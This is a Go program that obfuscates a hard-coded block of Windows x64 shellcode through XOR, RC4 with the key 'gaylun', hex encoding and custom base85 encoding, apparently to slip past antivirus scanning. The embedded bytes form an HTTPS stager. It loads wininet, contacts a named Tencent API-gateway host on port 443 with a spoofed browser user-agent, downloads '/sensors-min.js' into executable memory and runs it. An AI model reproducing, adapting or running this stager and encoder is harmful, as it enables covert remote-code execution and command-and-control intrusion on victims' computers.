package main

import (
	"crypto/rc4"
	"encoding/hex"
	"fmt"

	"github.com/eknkc/basex"
)

func main() {
	key := []byte("gaylun") // RC4 加密使用的密钥
	message := "\xfc\x48\x83\xe4\xf0\xe8\xc8\x08\x0f\xb7\x4a\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xe9\x93\x00\x00\x00\x5a\x48\x89\xc1\x41\xb8\xbb\x01\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x79\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x32\xc0\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\xba\x1f\x00\x00\x00\x6a\x00\x68\x80\x33\x00\x00\x49\x89\xe0\x41\xb9\x04\x00\x00\x00\x41\xba\x75\x46\x9e\x86\xff\xd5\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xb3\xe9\xe4\x01\x00\x00\xe8\x82\xff\xff\xff\x2f\x73\x65\x6e\x73\x6f\x72\x73\x2d\x6d\x69\x6e\x2e\x6a\x73\x00\xc8\x0c\x07\x62\xda\x2c\xf7\x95\xd0\x0e\xfa\x94\x5a\xcf\xb7\xb3\xf9\x1d\x9e\x3c\x41\x5f\x6f\x53\x36\x78\x63\x48\x05\x10\xbf\x98\xb2\xd2\x13\x9c\xc0\xd0\xd0\x84\x51\x5a\xcf\x68\xf2\x72\x1f\xad\xcf\x1f\xd5\x31\xbe\x3e\x17\xa9\x48\x37\xc8\x30\x3f\xc9\x58\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x39\x30\x2e\x30\x2e\x34\x34\x33\x30\x2e\x32\x31\x32\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x0d\x0a\x00\xb8\xb3\x8a\x2f\xb1\x14\x7d\x3a\x37\x23\x15\xf1\x65\x98\x34\x6e\xc2\x99\x2b\x2a\x28\xa0\x0c\x79\x4d\x02\x75\x35\x4f\xe7\x0e\x04\x33\xaa\xc0\x89\xf7\x6e\xd7\xbb\xc1\x9e\xb2\xf6\x22\x06\x44\x0c\x8e\xe9\xf8\xfe\x4e\xa5\x06\x82\x0d\x9d\xe8\x6d\x3e\xed\x89\x98\xfd\xc2\x72\xca\xd5\xc3\xc1\x34\x7b\xfd\x97\x2f\x7e\xb1\xa6\x53\x42\x4b\x35\xe0\x30\xa6\x72\xc2\xe5\xbe\x89\x8c\x63\xcf\xee\x01\xb2\x25\xb1\x8a\x2e\x50\x46\x85\x4c\xa3\xf9\x9c\xc3\x4a\xcf\x83\x89\x4c\x8e\x82\xd0\x7a\x54\x18\x96\xc4\x6a\xab\x75\xfc\xca\xa0\x28\x83\xa6\x1f\x91\x2e\xcc\x53\xc6\xe0\x6b\x0a\x31\x34\xd3\xc4\x5f\x84\xbf\xb6\xbd\x3d\x34\x60\xb1\x5c\x1b\x29\x4e\xaa\x30\x41\x36\xc9\x08\x2b\xa2\x23\x4c\xba\x41\x2c\x61\x40\x63\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x7f\xfd\xff\xff\x73\x65\x72\x76\x69\x63\x65\x2d\x6b\x72\x72\x6f\x6f\x61\x73\x68\x2d\x31\x33\x30\x37\x37\x30\x30\x38\x31\x38\x2e\x73\x68\x2e\x61\x70\x69\x67\x77\x2e\x74\x65\x6e\x63\x65\x6e\x74\x63\x73\x2e\x63\x6f\x6d\x00\x05\xf5\xe1\x00"
	// XOR 操作
	xordMessage := make([]byte, len(message))
	for i := 0; i < len(message); i++ {
		xordMessage[i] = message[i] ^ 0xff
	}

	// RC4 加密
	cipher, _ := rc4.NewCipher(key)
	rc4Message := make([]byte, len(xordMessage))
	cipher.XORKeyStream(rc4Message, xordMessage)

	// 转为十六进制
	hexCiphertext := make([]byte, hex.EncodedLen(len(rc4Message)))
	n := hex.Encode(hexCiphertext, rc4Message)
	hexCiphertext = hexCiphertext[:n]

	// Base85 编码
	base85, _ := basex.NewEncoding("jklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~")
	encodedMessage := base85.Encode(hexCiphertext)

	fmt.Println(encodedMessage)
}
